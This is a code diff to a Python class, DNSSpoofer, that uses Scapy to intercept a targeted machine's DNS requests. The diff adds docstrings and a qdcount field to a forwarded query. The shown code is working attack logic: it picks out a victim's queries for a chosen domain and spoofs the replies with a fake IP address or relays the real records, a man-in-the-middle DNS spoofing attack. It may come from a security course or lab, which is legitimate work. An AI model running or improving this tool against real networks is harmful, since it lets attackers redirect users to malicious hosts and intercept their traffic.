@@ -67,6 +67,7 @@ class DNSSpoofer:
             return False
 
     def is_target_domain(self, pkt: Packet) -> bool:
+        """Whether a DNS message is querying the targeted domain"""
         if DNS in pkt:
             for i in range(int(pkt[DNS].qdcount)):
                 name = str(pkt[DNS].qd[i].qname)
@@ -77,6 +78,7 @@ class DNSSpoofer:
         return False
     
     def is_to_attacker(self, pkt: Packet) -> bool:
+        """Whether a packet is directly aimed at the attacker (this machine)"""
         if IP in pkt:
             return pkt[IP].dst == get_if_addr(self.interface)
         else:
@@ -116,6 +118,12 @@ class DNSSpoofer:
                     print('Type not supported, ignoring...')
 
     def handle_dns_packet(self, pkt: Packet) -> None:
+        """
+            Handle a single DNS package, doing one of three things:
+            - Spoof with fake ip address
+            - Spoof with legitimate record
+            - Ignore
+        """
         if self.is_from_target(pkt) and self.is_target_domain(pkt) and not self.is_to_attacker(pkt):
             # Is from targeted machine, and is a request for targeted domain
             print(f'Spoof DNS request for: {str(pkt[DNSQR].qname)}, to {pkt[IP].dst}, from {pkt[IP].src}')
@@ -126,7 +134,7 @@ class DNSSpoofer:
             spoofed_req: Packet = (
                 IP(dst=pkt[IP].dst) /
                 UDP(sport=pkt[UDP].sport, dport=pkt[UDP].dport) /
-                DNS(id=pkt[DNS].id, qd=DNSQR(qname=pkt[DNSQR].qname, qtype=pkt[DNSQR].qtype), rd=1)
+                DNS(id=pkt[DNS].id, qd=DNSQR(qname=pkt[DNSQR].qname, qtype=pkt[DNSQR].qtype), qdcount=1, rd=1)
             )
 
             real_res: Packet = sr1(spoofed_req, inter=1, retry=3, timeout=1, verbose=True)
